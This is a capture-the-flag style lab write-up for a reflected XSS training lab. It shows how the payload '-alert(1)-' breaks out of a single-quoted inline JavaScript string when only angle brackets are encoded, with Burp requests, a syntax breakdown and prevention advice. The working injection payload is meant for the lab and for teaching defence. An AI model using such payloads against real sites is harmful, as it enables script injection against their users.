# Lab 13: Reflected XSS into a JavaScript string with angle brackets HTML encoded

**Goal**: Break out of an inline JavaScript string literal to execute `alert(1)` when angle brackets (`<`, `>`) are HTML-encoded.

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. Angle brackets are HTML-encoded by the server, but the user search term is reflected directly inside an inline JavaScript string literal (`var searchTerms = '...'`).

---

## 🎯 Solution

1. Submit a search query in the search box.
2. Intercept the request using Burp Suite Proxy and send it to **Repeater**.
3. Observe that the search term is reflected inside a single-quoted JavaScript string:
   ```javascript
   var searchTerms = 'test123';
   ```
4. Escape the single-quoted JavaScript string context using:
   ```javascript
   '-alert(1)-'
   ```
5. Send the request to trigger `alert(1)` automatically upon page load.

![Lab 13 Burp Repeater Reflection](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20150043.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Search Feature & Intercept Request
Submit a test string (e.g., `test123`) in the search box. Intercept the search GET request in Burp Suite and send it to **Repeater**:

```http
GET /?search=test123 HTTP/2
Host: your-lab-id.web-security-academy.net
```

### Step 2: Analyze JavaScript String Reflection Context
Inspect the HTTP response body in Burp Repeater:

```html
<script>
    var searchTerms = 'test123';
    trackSearch(searchTerms);
</script>
```

- Angle brackets (`<`, `>`) are HTML-encoded.
- Single quotes (`'`) are **NOT** escaped!

### Step 3: Construct Payload
To break out of the single-quoted string `'test123'` without syntax errors, construct a valid JavaScript arithmetic expression:

```javascript
'-alert(1)-'
```

When injected into `var searchTerms = '...'`, the resulting inline JavaScript evaluates as:

```javascript
var searchTerms = ''-alert(1)-'';
trackSearch(searchTerms);
```

#### Syntax Breakdown:
1. `''`: Empty string literal.
2. `- alert(1)`: Subtract operator forces evaluation of `alert(1)` function.
3. `-'':` Second subtract operator joins the trailing empty string literal, preserving JavaScript syntax validity.

### Step 4: Verify and Execute Exploitation
Send the modified request in Burp Repeater or open the URL in the browser:

```http
/?search='-alert(1)-'
```

![Lab 13 Injecting Payload in Repeater](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20150402.png)

Load the page in the browser. The browser parses the inline `<script>` tag and executes `alert(1)`:

![Lab 13 Solved Alert](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20150419.png)

> [!SUCCESS]
> **Lab Solved**: Successfully broke out of the JavaScript string and executed `alert(1)`!

---

## 💡 Key Takeaways: JavaScript String Injection

- **Context Sensitivity**: HTML entity encoding (`&lt;`, `&gt;`) does **NOT** prevent XSS inside inline `<script>` blocks because browsers parse raw JavaScript syntax within script tags before rendering.
- **Quote Escaping**: Single quotes (`'`) and backslashes (`\`) must be escaped when embedding user input inside JavaScript string literals.

---

## 🔒 Prevention

> [!TIP]
> 1. **JavaScript Encoding**: Use JavaScript-specific Unicode escaping (`\x27` for `'`, `\x22` for `"`, `\x5C` for `\`) instead of HTML entity encoding when reflecting data inside JavaScript contexts.
> 2. **JSON Serialization**: Pass server-side variables to inline JavaScript using safe JSON serialization (`JSON.stringify(searchTerm)`).
